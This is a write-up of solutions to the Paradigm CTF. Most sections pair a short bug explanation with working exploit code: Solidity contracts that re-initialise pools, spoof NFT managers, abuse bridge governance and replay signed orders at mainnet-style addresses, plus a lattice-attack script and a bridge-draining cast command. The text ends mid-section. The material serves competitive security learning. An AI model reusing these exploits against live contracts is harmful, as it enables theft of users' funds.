# Paradigm CTF Writeup
We have solved all challenges (didn't manage to get the exploit working for JOP in the last minute 😭). 

* [DODNT](#dodont)  
* [Token Locker](#token-locker)  
* [Suspicious Charity](#suspicious-charity)  
* [DAI++](#dai)  
* [Dragon Tyrant](#dragon-tyrant)
* [Oven](#oven) 
* [Black Sheep](#black-sheep)
* [Skill Based Game](#skill-based-game)
* [Blockchain Enterprise](#blockchain-enterprise) 
* [Hopping Into Place](#hopping-into-place) 
* [Grains of Sand](#grains-of-sand) 
* [Dropper](#dropper) 
* [Free Real Estate](#free-real-estate) 
* [Cosmic Radiation](#cosmic-radiation) 

### DODONT
The DVM contract deployed at `0x1a650d6F031555837D016142b5Aec2E76ab5637F`'s init can be called by anyone. 

```solidity
import "forge-std/test.sol";
import "../src/Challenge.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "forge-std/console.sol";

interface CloneFactoryLike {
    function clone(address) external returns (address);
}

interface DVMLike {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function buyShares(address) external;
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
    function _QUOTE_TOKEN_() external view returns (address);
}

contract QuoteToken is ERC20 {
    constructor() ERC20("Quote Token", "QT") {
        _mint(msg.sender, 1_000_000 ether);
    }

    function mint(address to, uint256 value) public {
        _mint(to, value);
    }
}


contract Exploit {
    CloneFactoryLike private immutable CLONE_FACTORY = CloneFactoryLike(0x5E5a7b76462E4BdF83Aa98795644281BdbA80B88);
    address private immutable DVM_TEMPLATE = 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445;

    IERC20 private immutable WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address public challenge;
    address public system;
    DVMLike public dvm;
    QuoteToken public quoteToken;

    function exploit() public {
        dvm = DVMLike(Challenge(0x1a650d6F031555837D016142b5Aec2E76ab5637F).dvm());
        quoteToken = QuoteToken(dvm._QUOTE_TOKEN_());
        dvm.flashLoan(WETH.balanceOf(address(dvm)), 
            quoteToken.balanceOf(address(dvm)),
            address(this), hex"11");
    }

    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {
        QuoteToken t1 = new QuoteToken();
        QuoteToken t2 = new QuoteToken();
        t1.transfer(address(dvm), 1_000_000 ether);
        t2.transfer(address(dvm), 1_000_000 ether);


        dvm.init(address(this), 
            address(t1),
            address(t2),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );
    }
}
```




### Token Locker
ERC20 and ERC721 share same function signature. You can exploit this observation and make Uniswap V3 NFT to be treated as an ERC20 token in the protocol.


```solidity
import "forge-std/test.sol";
import "forge-std/console.sol";
import "../src/Challenge.sol";
import "../src/UNCX_ProofOfReservesV2_UniV3.sol";


contract Exploit {
    Challenge c = Challenge(0x0147383f0CA823cCc5F5609302b0fAEFFa48A5E8);
    IUNCX_ProofOfReservesV2_UniV3 v = IUNCX_ProofOfReservesV2_UniV3(0x7f5C649856F900d15C83741f45AE46f5C6858234);
    INonfungiblePositionManager u = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IUniswapV2Router02 r = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 ctid;

    function exploit(uint256 m) public {
        for (uint256 i = 0; i < m; i++) {
            ctid = u.tokenOfOwnerByIndex(address(v), 0);
            console.log(ctid);



            bytes[] memory r = new bytes[](0);

            
            LockParams memory lock = LockParams({
                nftPositionManager: INonfungiblePositionManager(address(this)),
                nft_id: 24,
                dustRecipient: address(this),
                owner: address(this),
                additionalCollector: address(this),
                collectAddress: address(this),
                unlockDate: block.timestamp + 1,
                countryCode: 0,
                feeName: "DEFAULT",
                r: r
            });
            v.lock(lock);
            u.transferFrom(address(v), address(this), ctid);
        }

        console.log("balanceOf", u.balanceOf(address(v)));
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) public {
        
    }

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        )
    {
        nonce = 0;
        operator = address(this);
        token0 = address(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
        token1 = address(this);
        fee = 0;
        tickLower = 0;
        tickUpper = 0;
        liquidity = 0;
        feeGrowthInside0LastX128 = 0;
        feeGrowthInside1LastX128 = 0;
        tokensOwed0 = 0;
        tokensOwed1 = 0;
    }


    function factory() external view returns (address) {
        return address(this);
    }


    function getPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external view returns (address) {
        return address(this);
    }

    function feeAmountTickSpacing(uint24 fee) external view returns (int24) {
        return 1;
    }

    function decreaseLiquidity(INonfungiblePositionManager.DecreaseLiquidityParams calldata params)
    external
    payable
    returns (uint256 amount0, uint256 amount1) {
        return (0, 0);
    }

    function collect(INonfungiblePositionManager.CollectParams calldata params) external payable returns (uint256 amount0, uint256 amount1) {
        return (ctid, 0);
    }


    function balanceOf(address owner) external view returns (uint256) {
        return 0;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        return true;
    } 


    function burn(uint256 tokenId) external payable {

    }


    function mint(INonfungiblePositionManager.MintParams calldata params)
        external
        payable
        returns (
            uint256 tokenId,
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1
        ) {
            return (0, 0, ctid, 0);
        }

        function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        public
        pure
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```



### Suspicious Charity
The Python script cache pool's tokens address based on its name, which is formed using `string(uint8)`. We recognize that when `string(>79)`, they become the same in the Python script, which can lead to using incorrect cache. The exploit first create 78 useless pairs, then one pair with low liquidity but high price. After it got cached, we then create a pair with high liquidity but low price. Note that here, in the Python script, the price of the pair is mistreated as the previous expensive pair's.


```solidity
import "../src/Challenge.sol";
import "../src/Router.sol";
import "../src/Token.sol";
import "forge-std/console.sol";
import "forge-std/test.sol";


contract Exploit {
    Router r;

    constructor() {
        Challenge chall = Challenge(0x10d9E3Da7B5e7381A0506BED1068FE4E9d0158Bb);
        r = Router(chall.ROUTER());
    }

    function setUp() public {
        vm.createSelectFork("http://suspicious-charity.challenges.paradigm.xyz:8545/dcb357a1-0c83-4b1a-bb54-386f76241448/main", 18451421);
        Challenge chall = Challenge(0x10d9E3Da7B5e7381A0506BED1068FE4E9d0158Bb);
        r = Router(chall.ROUTER());
    } 


    function STEP0() public {
        require(r.totalListing() <= 78 * 2, "EXCEED_LISTING_CAP");
        address t1 = r.createToken("a", "a");
        address t2 = r.createToken("b", "b");
        r.listing(t1, 1);
        r.listing(t2, 1);
        r.mint(t1,  10 ** 3 + 1);
        r.mint(t2,  10 ** 3 + 1);
        address pair_addr = r.createPair(t1, t2);
        Pair pair = Pair(pair_addr);
        Token(t1).transfer(address(pair), 10 ** 3 + 1);
        Token(t2).transfer(address(pair),  10 ** 3 + 1);
        pair.mint(address(this));
    }

    function STEP1() public {
        address t1 = r.createToken("a", "a");
        address t2 = r.createToken("b", "b");
        r.listing(t1, 1e16);
        r.listing(t2, 1e16);
        r.mint(t1, 1e3 + 1);
        r.mint(t2, 1e3 + 1);
        address pair_addr = r.createPair(t1, t2);
        Pair pair = Pair(pair_addr);
        Token(t1).transfer(address(pair), 1e3 + 1);
        Token(t2).transfer(address(pair), 1e3 + 1);
        pair.mint(address(this));
    }



    function STEP2() public {
        address t1 = r.createToken("a", "a");
        address t2 = r.createToken("b", "b");
        r.listing(t1, 1);
        r.listing(t2, 1);
        r.mint(t1, 1e16);
        r.mint(t2, 1e16);
        address pair_addr = r.createPair(t1, t2);
        Pair pair = Pair(pair_addr);
        Token(t1).transfer(address(pair), 1e15);
        Token(t2).transfer(address(pair), 1e15);
        pair.mint(address(this));

        pair.transfer(address(r.flagCharity()), pair.balanceOf(address(this)));
    }

    
}
```

### DAI++

The vulnerable code is
```solidity
    function _openAccount(address owner, address[] calldata recoveryAddresses) private returns (Account) {
        Account account = Account(
            SYSTEM_CONFIGURATION.getAccountImplementation().clone(
                abi.encodePacked(SYSTEM_CONFIGURATION, owner, recoveryAddresses.length, recoveryAddresses)
            )
        );

        validAccounts[account] = true;

        return account;
    }
```

In the implmentation of `clone`, it says

```
    /// @notice Creates a clone proxy of the implementation contract, with immutable args
    /// @dev data **cannot exceed 65535 bytes**, since 2 bytes are used to store the data length
    /// @param implementation The implementation contract to clone
    /// @param data Encoded immutable args
    /// @return instance The address of the created clone
```

Passing in a huge `recoveryAddresses` to `openAccount` will end up overwriting slots. I first wanted to control the `configuration` slot of an Account. So theoretically we can create an Account and overwrite the `configuration` to our evil contract, and let the evil contract return evil ETH price or collateral ratio.

During testing, I found that just by passing in an array of length 2044 is enough. Did not spend more time investigating what got overwritten.

```solidity
        vm.startBroadcast();
        address[] memory recoveryAddresses = new address[](2044);
        Acct temp = manager.openAccount(
            address(this),
            recoveryAddresses
        );
        manager.mintStablecoins(temp, 1_000_000_000_001 ether, "test");
        vm.stopBroadcast();
```

### Dragon Tyrant

The goal is to burn the NFT token owned by the NFT token contract itself by winning the fight. 

The equipment in the shop doesn't have high enough attack/defense and you need highest attack/defense because the NPC has highest attack and you only have 1HP. Just craft your custom shop and don't worry about the code hash validation because the item infos are stored in the storage.

And the hardest part is too derive generate(seed, 2) from generate(seed, 1). It's about the calculation on bn_alt128 curve.

```
p = 0x123456789 
q = sha3(p)

P = p * G
Q = q * G

# generate 1
N1 = s * P
N2 = N1_x * Q = N1_x * q * G = q * (N1_x * G)

# generate 2 
N1 = s * P
M1 = N1_x * P = N1_x * p * G = p * (N1_x * G)
M2 = M1_x * Q

Known values: N2_x, p, q, G

1. Derive N2_y from N2_x
2. N2 = q * (N1_x * G) ==> N2 * q^-1 = N1_x * G
3. M1 = p * (N1_x * G)
4. ..
```

```solidity
import "forge-std/Test.sol";
import "../src/Challenge.sol";
import "./EllipticCurve.sol";

contract MyShop is ItemShop {
    constructor(ItemShop shop) {
        _itemInfo[1] = ItemInfo({name: "", slot: EquipmentSlot.Weapon, value: type(uint40).max, price: 0});
        _mint(address(this), 1, 100, "");

        _itemInfo[2] = ItemInfo({name: "", slot: EquipmentSlot.Shield, value: type(uint40).max, price: 0});
        _mint(address(this), 2, 100, "");

        assembly {
            extcodecopy(shop, 0, 0, extcodesize(shop))
            return(0, extcodesize(shop))
        }
    }
}

contract Exploit {
    Challenge CHAL;
    MyShop SHOP;
    NFT TOKEN;
    uint256 input = 0;

    uint256 public constant GX = 1;
    uint256 public constant GY = 2;
    uint256 public constant AA = 0;
    uint256 public constant BB = 3;
    uint256 public constant PP = 21888242871839275222246405745257275088548364400416034343698204186575808495617;
    uint256 public constant FO = 21888242871839275222246405745257275088696311157297823662689037894645226208583;

    function ecMul(uint256 k, uint256 x, uint256 y) internal returns (uint256, uint256) {
        (bool s, bytes memory data) = address(7).call(abi.encode(x, y, k));
        require(s, "call failed");
        (uint256 x1, uint256 y1) = abi.decode(data, (uint256, uint256));
        return (x1, y1);
    }

    function go(Challenge chal) external payable {
        SHOP = new MyShop(chal.ITEMSHOP());
        CHAL = chal;
        TOKEN = chal.TOKEN();

        address[] memory receivers = new address[](1);
        receivers[0] = address(this);

        TOKEN.batchMint(receivers);
    }

    function getInput(FighterVars calldata attacker, FighterVars calldata attackee) external returns (uint256 inputs) {
        return ~input;
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        if (from == address(0)) {
            SHOP.buy(1);
            SHOP.buy(2);

            ItemShop shop = SHOP;

            shop.setApprovalForAll(address(TOKEN), true);

            TOKEN.equip(tokenId, address(shop), 1);
            TOKEN.equip(tokenId, address(shop), 2);

            Trait memory trait = TOKEN.traits(tokenId);

            uint256 rand = uint256(trait.charisma) << 216 | uint256(trait.wisdom) << 176
                | uint256(trait.intelligence) << 136 | uint256(trait.constitution) << 96 | uint256(trait.dexterity) << 56
                | uint256(trait.strength) << 16 | uint256(trait.rarity);

            console2.log("rand: %x", rand);

            {
                uint256 n2x = rand;
                uint256 n2y = EllipticCurve.deriveY(2, n2x, AA, BB, FO);

                uint256 p = 0x123456789;
                uint256 q = 0xc8243991757dc8723e4976248127e573da4a2cbfad54b776d5a7c8d92b6e2a6b;
                uint256 invQ = EllipticCurve.invMod(q, PP);

                (uint256 Qx, uint256 Qy) = ecMul(q, 1, 2);
                (uint256 n1xGx, uint256 n1xGy) = ecMul(invQ, n2x, n2y);
                (uint256 m1x, uint256 m1y) = ecMul(p, n1xGx, n1xGy);
                (uint256 m2,) = ecMul(m1x, Qx, Qy);

                input = m2;
            }

            TOKEN.fight(uint128(tokenId), 0);
        }

        return this.onERC721Received.selector;
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }
}

contract ChallengeTest is Test {
    Challenge public immutable CHAL;
    ItemShop public immutable SHOP;
    NFT public immutable TOKEN;
    Factory public immutable FACTORY;
    MyShop public immutable MYSHOP;

    address player = makeAddr("Player");
    address randomBoy = makeAddr("RandomBoy");

    constructor() {
        FACTORY = new Factory();
        FACTORY.setRandomnessOperator(randomBoy);
        SHOP = ItemShop(FACTORY.createItemShop(address(FACTORY.latestItemShopVersion()), abi.encode("")));
        TOKEN = NFT(FACTORY.createCollection(abi.encode(string("Fighters"), string("FGHTRS"))));
        CHAL = new Challenge(FACTORY, SHOP, TOKEN);
    }

    function testChallenge() external {
        Exploit e = new Exploit();
        e.go(CHAL);

        NFT token = CHAL.TOKEN();

        vm.prank(randomBoy);
        token.resolveRandomness(keccak256(abi.encode("asdasdasdasfd")));

        require(token.balanceOf(address(TOKEN)) == 0, "not solved");
    }
}

```

### Oven

The random number v is chosen over $2$ ~ $2^{512}$, which is relatively small compared to $(p-1) \in 2^{1024}$, giving us the chance to exploit the hidden number problem. We use LLL to recover the flag.

```sage
# Use SageMath 10.1
from pwn import *
from Crypto.Util.number import *
import re

def parse_msg(msg):
    lines = msg.split('\n')
    regex = re.compile(r'(\w*) = (\d*)')
    params = {m.group(1): int(m.group(2)) for m in (regex.match(line) for line in lines) if m}
    return params['t'], params['r'], params['p'], params['g'], params['y']

def custom_hash(n):
    def xor(a, b):
        return bytes([i ^^ j for i, j in zip(a, b)])
    state = b"\x00" * 16
    for i in range(len(n) // 16):
        state = xor(state, n[i : i + 16])
    for _ in range(5):
        state = hashlib.md5(state).digest()
        state = hashlib.sha1(state).digest()
        state = hashlib.sha256(state).digest()
        state = hashlib.sha512(state).digest() + hashlib.sha256(state).digest()
    return bytes_to_long(state)

def get_msg(conn):
    return conn.recvuntil(b'Choice:').decode('ascii')

conn = remote('oven.challenges.paradigm.xyz', int(1337))
_ = get_msg(conn)

qs = []
cs = []
rs = []
N = 50
for i in range(N):
    conn.sendline(b'1')
    t, r, p, g, y = parse_msg(get_msg(conn))
    c = custom_hash(long_to_bytes(g) + long_to_bytes(y) + long_to_bytes(t))
    qs.append(p-1)
    cs.append(c)
    rs.append(r)
conn.close()

M = matrix(ZZ, N+2, N+2)
for i in range(N):
    M[i,i]  = qs[i]
    M[-2,i] = cs[i]
    M[-1,i] = rs[i]
M[-2,-2] = 1
M[-1,-1] = 2^248
M_lll = M.LLL()
x = M_lll[0,-2]

print(long_to_bytes(x))
```

### Black Sheep

The stack is not balanced in the CHECKVALUE() macro

```solidity
contract Exploit {
    function go(ISimpleBank bank) external payable {
        bank.withdraw{value: 10}(
            0xfba3116b2dc7c011ab246ddea7d507cdeb18be7e3cf52e70e11f24644e0f436f,
            0x00,
            0xfba3116b2dc7c011ab246ddea7d507cdeb18be7e3cf52e70e11f24644e0f436f,
            0xfba3116b2dc7c011ab246ddea7d507cdeb18be7e3cf52e70e11f24644e0f436f
        );
    }

    fallback() external payable {
        require(msg.value > 20);
    }
}
```

### Skill Based Game

```solidity
contract Black {
    address private immutable BLACKJACK = 0xA65D59708838581520511d98fB8b5d1F76A96cad;
    function deal1(address player, uint8 cardNumber) public view returns (uint8) {
        uint256 timestamp = block.timestamp;
        return uint8(uint256(keccak256(abi.encodePacked(uint256(0), player, cardNumber, timestamp))) % 52);
    }

    function valueOf(uint8 card, bool isBigAce) internal pure returns (uint8) {
        uint8 value = card / 4;
        if (value == 0 || value == 11 || value == 12) {
            // Face cards
            return 10;
        }
        if (value == 1 && isBigAce) {
            // Ace is worth 11
            return 11;
        }
        return value;
    }

    function isAce(uint8 card) internal pure returns (bool) {
        return card / 4 == 1;
    }

    function isTen(uint8 card) internal pure returns (bool) {
        return card / 4 == 10;
    }

    function test() public payable {
        bytes32 initcodeHash = keccak256(type(Poc).creationCode);
        for (uint256 i = 0; i < 200; i++) {
            uint256 amount = 5 ether;
            if (BLACKJACK.balance == 0) {
                break;
            } else if (BLACKJACK.balance < amount) {
                amount = BLACKJACK.balance;
            }
            address player = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(i), initcodeHash))))
            );
            uint8 cardNumber0 = deal1(player, uint8(0));
            uint8 cardNumber1 = deal1(player, uint8(2));
            if (valueOf(cardNumber0, isAce(cardNumber0)) + valueOf(cardNumber1, isAce(cardNumber1)) == 21) {
                console2.log("Found", player, i);
                player = address(new Poc{salt: bytes32(i), value: amount}());
            }
        }
        console2.log(BLACKJACK.balance);
    }
}

contract Poc {
    constructor() payable {
        0xA65D59708838581520511d98fB8b5d1F76A96cad.call{value: msg.value}(abi.encodeWithSignature("deal()"));
    }
}

```

### Blockchain Enterprise

The sendRemoteMessage is permissionless. So just ask the bridge on another side to transfer away their tokens

```shell

# switch to l2 rpc first

cast send --private-key $PK $BRIDGE "sendRemoteMessage(uint256 _targetChainId, address _targetAddress, bytes calldata _message)" 78704 $FLAG_TOKEN $(cast calldata "transfer(address,uint256)" 0x477fb120e097c73dbe0a3c44c8b19b51e9f16136 80ether)
```


### Hopping Into Place

What can you do as an admin?

```solidity
import "forge-std/Test.sol";
import "../src/Challenge.sol";

interface IMessengerWrapper {
    function sendCrossDomainMessage(bytes memory _calldata) external;
    function verifySender(address l1BridgeCaller, bytes memory _data) external;
}

contract Exploit is IMessengerWrapper {
    IBridge private immutable bridge = IBridge(0xb8901acB165ed027E32754E0FFe830802919727f);

    constructor() {}

    function go() external payable {
        uint256 cId = 0x1234567;

        bridge.addBonder(address(this));
        bridge.setChallengePeriod(0);
        bridge.setCrossDomainMessengerWrapper(cId, address(this));

        // Manipulate the chainBalance
        bridge.bondTransferRoot(keccak256("fuck"), cId, 100000 ether);

        uint256 amount = address(bridge).balance;
        uint256 chainId = 1;
        address recipient = address(this);
        uint256 deadline = block.timestamp * 2;

        bytes32 leaf = keccak256(abi.encode(chainId, recipient, amount, 0, 0, 0, deadline));
        bytes32 rootHash = keccak256(abi.encodePacked(leaf, keccak256("fuck")));
        bridge.confirmTransferRoot(cId, rootHash, chainId, amount, block.timestamp);

        bytes32[] memory siblings = new bytes32[](1);
        siblings[0] = keccak256("fuck");
        bridge.withdraw(recipient, amount, 0, 0, 0, deadline, rootHash, amount, 0, siblings, 2);
    }

    receive() external payable {}

    function sendCrossDomainMessage(bytes memory _calldata) external {}
    function verifySender(address l1BridgeCaller, bytes memory _data) external {}
}

contract Hop is Test {
    IBridge private immutable bridge = IBridge(0xb8901acB165ed027E32754E0FFe830802919727f);
    Challenge private chal;
    address private immutable player = address(0x23489325419302849011337);

    function setUp() external {
        address governance = bridge.governance();
        payable(governance).transfer(1 ether);

        bridge.sendToL2{value: 900 ether}(10, address(this), 900 ether, 0, 0, address(0x00), 0);
        chal = new Challenge(address(bridge));

        vm.prank(governance, governance);
        bridge.setGovernance(player);

        vm.deal(player, 888 ether);
        vm.startPrank(player);
    }

    function test_Hi() external {
        Exploit exploit = new Exploit();
        bridge.setGovernance(address(exploit));
        exploit.go();

        console.log("Bridge: %d", address(bridge).balance / 1 ether);
        require(chal.isSolved(), "Challenge not solved.");
    }
}

interface IBridge {
    function governance() external view returns (address);
    function setGovernance(address) external;
    function sendToL2(uint256, address, uint256, uint256, uint256, address, uint256) external payable;

    function setCrossDomainMessengerWrapper(uint256, address) external;
    function confirmTransferRoot(
        uint256 originChainId,
        bytes32 rootHash,
        uint256 destinationChainId,
        uint256 totalAmount,
        uint256 rootCommittedAt
    ) external;

    function withdraw(
        address recipient,
        uint256 amount,
        bytes32 transferNonce,
        uint256 bonderFee,
        uint256 amountOutMin,
        uint256 deadline,
        bytes32 rootHash,
        uint256 transferRootTotalAmount,
        uint256 transferIdTreeIndex,
        bytes32[] calldata siblings,
        uint256 totalLeaves
    ) external;

    function chainBalance(uint256) external view returns (uint256);
    function setChallengePeriod(uint256 _challengePeriod) external;
    function bondTransferRoot(bytes32 rootHash, uint256 destinationChainId, uint256 totalAmount) external;
    function addBonder(address bonder) external;
}

```

### Grains of Sand

Trade order can be partially fulfilled so just searched on-chain record for those whose order is still opened and have a large `_expires`

```solitiy
interface IInstantTrade {
    function instantTrade(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s,
        uint256 _amount,
        address _store
    ) external payable;
}

contract Exploit {
    ITokenStore private constant STORE = ITokenStore(0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8);
    IERC20 private constant TOKEN = IERC20(0xC937f5027D47250Fa2Df8CbF21F6F88E98817845);
    IInstantTrade private constant INSTANT_TRADE = IInstantTrade(0xE17dBB844Ba602E189889D941D1297184ce63664);

    constructor() payable {
        uint256 amountGet = 42468000000000000;
        uint256 amountGive = 1000000000000;
        uint256 expires = 109997981;
        uint256 nonce = 0xedcfbbe;
        address user = 0x6FFacaa9A9c6f8e7CD7D1C6830f9bc2a146cF10C;
        uint8 v = 0x1c;
        bytes32 r = 0x2b80ada8a8d94ed393723df8d1b802e1f05e623830cf117e326b30b1780ae397;
        bytes32 s = 0x65397616af0ec4d25f828b25497c697c58b3dcc852259eaf7c72ff487ce76e1e;

        uint256 volume =
            STORE.availableVolume(address(0), amountGet, address(TOKEN), amountGive, expires, nonce, user, v, r, s);
        uint256 valueToPass = volume * 1004 / 1000;

        INSTANT_TRADE.instantTrade{value: valueToPass}(
            address(0), amountGet, address(TOKEN), amountGive, expires, nonce, user, v, r, s, volume, address(STORE)
        );
    }

    function go(uint256 it) external {
        require(TOKEN.balanceOf(address(this)) > 0, "Exploit: failed to trade");

        TOKEN.approve(address(STORE), type(uint256).max);

        uint256 beforeBalance = TOKEN.balanceOf(address(STORE));

        for (uint256 i = 0; i < it; i++) {
            STORE.depositToken(address(TOKEN), TOKEN.balanceOf(address(this)));
            STORE.withdrawToken(address(TOKEN), STORE.tokens(address(TOKEN), address(this)) - 1);
        }

        uint256 afterBalance = TOKEN.balanceOf(address(STORE));

        console2.log("Diff: %d", (beforeBalance - afterBalance) / 1e8);
    }
}
```

### Dropper

1. Use Access List to warm up storage
2. Calculate addresses, amounts and hardcode them into the contract

```huff
//
//    0xc1a38006: function airdropETH(address[] calldata, uint256[] calldata) external payable;
//    0x82947abe: function airdropERC20(address, address[] calldata, uint256[] calldata, uint256) external;
//    0x1d5659fb: function airdropERC721(address, address[] calldata, uint256[] calldata) external;

#define function transferFrom(address, address, uint256) nonpayable returns (bool)

#define constant ERC20_TOKEN = 0xA104Cdd874D2B9D2F81a0cd56D428f75Ed5E20Db
#define constant ERC721_TOKEN = 0x405616b1Ea30dB245F0832737D407Ec7149940Ad

#define macro AIRDROP_NATIVE() = takes (0) returns (0) {
    0x00
    0x00 0x00 0x00 0x2e9c588d9078087c 0x290DEcD9548b62A8D60345A988386Fc84Ba6BC95 0x8000 call
    0x00 0x00 0x00 0x3569187f1b8c035d 0xe464e8DE422FB6F1828d6de8DDf2C3E8eD2A1f57 0x8000 call
    0x00 0x00 0x00 0x327829c0b7b65da6 0x93912b09530D648dbbb46f461115e15D5538BAcA 0x8000 call
    0x00 0x00 0x00 0x3732a53e452e7305 0x3c7B2ee3D0C544d7497eB091dBCfE00df31a9fAa 0x8000 call
    0x00 0x00 0x00 0x375fec7e0c6d1079 0x20Ad5faFBd216137E51ad197DC2C9e89998e0420 0x8000 call
    0x00 0x00 0x00 0x267fff8d65c7657c 0x0b8ffe8EbeD5D84150Ecdf21A00DE44664D23A50 0x8000 call
    0x00 0x00 0x00 0x1db415dc5ce8ff85 0x5de68aC123078B874Ab7b57a4Ff45f50e32Ee2eF 0x8000 call
    0x00 0x00 0x00 0x3e64c36fc2c5bc00 0xf88A3a8Ae7f38598A170Be11d7e54CeAb10D7eeD 0x8000 call
    0x00 0x00 0x00 0x37d4740705e6d448 0x312E6109b898163A7A736EE59636b3cE83264631 0x8000 call
    0x00 0x00 0x00 0x3f45669fe98aa3c2 0x033106f181e2f364712E03A49106759e58D79c81 0x8000 call
    0x00 0x00 0x00 0x196509c0d2539fb2 0x3bef586e899123fB0E1103ac3b7f8f53735777E9 0x8000 call
    0x00 0x00 0x00 0x35932775e1352c9f 0x1cB95C4d578A4Fe791249D99b396D0fA303B0A77 0x8000 call
    0x00 0x00 0x00 0x11b28b8e9abdd19a 0x229dFa9d0292930311CAA096F713E853b637D2ea 0x8000 call
    0x00 0x00 0x00 0x38aefaad192c7743 0x06Fefa9903e4D5B7d5FBD9D22Ab410a005D7dDA3 0x8000 call
    0x00 0x00 0x00 0x3703a8ed62c5e9db 0x0Edd176402D5194E3eFd202F60B626775148aDaE 0x8000 call
    0x00 0x00 0x00 0x2fd0cccdae7029a4 0x387E43dcD300d5b9fb4F2d7196d966E609ef3C9C 0x8000 call
    stop
}

// (address, address[] calldata, uint256[] calldata, uint256)
#define macro AIRDROP_ERC20() = takes (0) returns (0) {
    __FUNC_SIG(transferFrom) 0x00 mstore
    caller 0x20 mstore

    0x00
    0x147a7c7d4dfd9481 0x60 mstore 0xC22E0d7de9067d31ff1043d2794865D84930a5EF 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x3bb170cf8cb50db4 0x60 mstore 0x92F5A1b3eC6052b8205e505fd363A5D70F0e7B5A 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x17930176ade983f2 0x60 mstore 0x0E8fd33A5f9EcDD852e07CEC01Ee7126CbAA7b27 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x1d803886464ef16e 0x60 mstore 0x83d4942d8D3F3f4ba82271A5d846b7bAB86a7edb 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x2e000dfe62e2665a 0x60 mstore 0x5939C8a860b7241Ef27291c98a34A6a4eC195aFD 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x1d77c92a870f12b0 0x60 mstore 0x3D00E364CAd99077C78F8fF4BBA013F8ab895ff5 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x3ed5738af8003431 0x60 mstore 0x2bAb27f9b536b3d808f86Ca35F3d90a0B8734e40 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x40f7b803bffe4310 0x60 mstore 0xA24730073264C3cF3FFe29e80C0BF2025435d9e2 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x1daf8e2ad22e798f 0x60 mstore 0xfddC476A04D917018c8f3e6d41A119370bDc15a6 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x33483a33777c5256 0x60 mstore 0x4A0d1e8B9D357F1eE1b526D4D4E4CE6b154224bB 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x14ac94de1db03965 0x60 mstore 0x337c7Cf2CFc065015Db24af8558325D4aA1c4e5D 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x2ab1fb7f8a059a42 0x60 mstore 0x490283523B609D41Dc5AA03E84b052532ea2CFb7 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x3b505018ad2ac6b6 0x60 mstore 0x06414EbfFCeD816377D9c3768F50414e1831cc73 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x39891c4c81209f86 0x60 mstore 0x96612095710b39A6b9b2b4Ef7A46Cbe1CC137e0D 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x2c0df24e79ac98f6 0x60 mstore 0x48924cC40237E64Cb81D812c04B69fBAc82F189C 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call
    0x3f3219f190631819 0x60 mstore 0x724994Af51D4642f70E784d6BA490A87730ac6Cd 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC20_TOKEN] 0x8000 call

    stop
}

// (address, address[] calldata, uint256[] calldata)
#define macro AIRDROP_ERC721() = takes (0) returns (0) {
    __FUNC_SIG(transferFrom) 0x00 mstore
    caller 0x20 mstore

    0x00

